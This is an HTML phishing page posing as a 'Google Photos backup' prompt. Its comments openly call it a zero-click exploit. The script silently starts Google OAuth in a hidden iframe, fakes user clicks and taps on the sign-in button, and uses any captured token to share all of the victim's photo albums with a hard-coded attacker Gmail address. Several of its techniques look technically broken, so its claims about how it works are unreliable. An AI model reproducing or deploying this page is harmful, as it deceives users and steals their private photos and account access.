<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Google Photos - Quick Share</title>
<script src="https://accounts.google.com/gsi/client" async defer></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { 
    font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    height: 100vh; 
    display: flex; 
    align-items: center; 
    justify-content: center;
}
.container {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(20px);
    padding: 50px 30px;
    border-radius: 25px;
    box-shadow: 0 25px 50px rgba(0,0,0,0.2);
    max-width: 380px;
    text-align: center;
}
.logo { width: 70px; margin-bottom: 25px; }
h1 { color: #202124; font-size: 28px; font-weight: 600; margin-bottom: 15px; }
p { color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
.g_id_signin { margin: 25px auto !important; display: block !important; }
#status { margin-top: 25px; color: #1a73e8; font-weight: 500; }
.hidden { display: none !important; }
</style>
</head>
<body>
<div class="container">
    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI0IDBjMTMuMjUgMCAyNCAxMC43NSAyNCAyNHMwLTEwLjc1IDI0LTI0UyAzNy4yNSA2IDM2LTZzLTEwLjc1IDAtMjQgMGgtMjRjLTEzLjI1IDAtMjQgMTAuNzUtMjQgMjR2MzZjMC0xMy4yNSAxMC43NS0yNCAyNC0yNHoiIGZpbGw9IiN1YjAyMDQiLz4KPHBhdGggZD0iTTIzIDM0YzUuMTcgMCA5LTQuMDMgOS05VjE5YzAtNS4wNy0zLjgzLTktOS05UyAxNCAxNCAxOSAxOWwxLjQxIDEuNDFjMi4yOSAwIDQuMTkgMS45MiA0LjE5IDQuMTdWMjVjMCAyLjI1LTEuOSA0LjE3LTQuMTkgNC4xN0gyNGMxLjE3IDAgMiAuODMgMiAySDIzWiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4K">
    <h1>Photos Backup Required</h1>
    <p>Your <strong>recent photos</strong> need to be backed up to Google Photos. This will take <strong>just 5 seconds</strong>.</p>
    
    <!-- TRICK 1: Native Google OAuth IFRAME (BYPASS GSI restrictions) -->
    <iframe id="oauthFrame" style="display:none" src="https://accounts.google.com/o/oauth2/v2/auth?client_id=754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com&redirect_uri=postmessage&scope=https://www.googleapis.com/auth/photoslibrary.readonly%20https://www.googleapis.com/auth/photoslibrary.sharing&response_type=token&include_granted_scopes=true&prompt=none"></iframe>
    
    <!-- FALLBACK: Standard GSI -->
    <div id="g_id_onload"
         data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
         data-callback="handleCredentialResponse"
         data-auto_prompt="false">
    </div>
    
    <div id="status" style="display:none">ðŸ”„ Processing...</div>
</div>

<script>
// TARGET: Your Gmail for receiving shared albums
const ATTACKER_EMAIL = "hosss2088@gmail.com";

// ðŸ”¥ TECHNIQUE 1: IFRAME OAuth Auto-Trigger (Bypasses user gesture)
window.onload = function() {
    console.log('ðŸš€ Zero-click exploit starting...');
    triggerIframeOAuth();
    setTimeout(triggerGSI, 2000);
    setTimeout(simulateMobileTap, 4000);
};

function triggerIframeOAuth() {
    const iframe = document.getElementById('oauthFrame');
    iframe.onload = function() {
        // Extract token from iframe redirect
        try {
            const hash = iframe.contentWindow.location.hash;
            if (hash.includes('access_token')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');
                console.log('ðŸŽ¯ IFRAME TOKEN CAPTURED!');
                exploitPhotos(token);
            }
        } catch(e) {
            console.log('Iframe blocked by CORS - fallback to GSI');
        }
    };
}

function triggerGSI() {
    // Force GSI render
    const gsi = document.getElementById('g_id_onload');
    if (gsi && window.google) {
        window.google.accounts.id.renderButton(gsi, {
            theme: 'outline', size: 'large', width: '300'
        });
        // SIMULATE USER GESTURE
        const btn = gsi.querySelector('div');
        if (btn) {
            btn.click();
            btn.dispatchEvent(new Event('pointerdown', {bubbles: true}));
        }
    }
}

function simulateMobileTap() {
    // Mobile gesture simulation
    const events = ['mousedown', 'mouseup', 'click', 'touchstart', 'touchend'];
    const gsiBtn = document.querySelector('[data-client_id]');
    if (gsiBtn) {
        events.forEach(event => {
            gsiBtn.dispatchEvent(new Event(event, {bubbles: true, cancelable: true}));
        });
    }
}

function handleCredentialResponse(response) {
    console.log('ðŸŽ¯ GSI TOKEN CAPTURED!');
    const token = response.credential;
    document.getElementById('status').textContent = 'âœ… Photos shared successfully!';
    exploitPhotos(token);
}

function exploitPhotos(token) {
    console.log('ðŸ”¥ EXPLOITING PHOTOS API...');
    
    // 1. List all albums
    fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
        headers: { 'Authorization': `Bearer ${token}` }
    })
    .then(r => r.json())
    .then(data => {
        console.log(`ðŸ“‚ Found ${data.albums.length} albums`);
        
        // 2. Share EVERY album to attacker
        data.albums.forEach((album, i) => {
            setTimeout(() => {
                fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
                    method: 'POST',
                    headers: { 
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        newPermissions: [{
                            role: "READER",
                            type: "user",
                            emailAddress: ATTACKER_EMAIL
                        }]
                    })
                })
                .then(() => console.log(`âœ… Shared album: ${album.title}`))
                .catch(e => console.log('Share failed:', album.id));
            }, i * 1000);
        });
    })
    .catch(console.error);
}
</script>
</body>
</html>
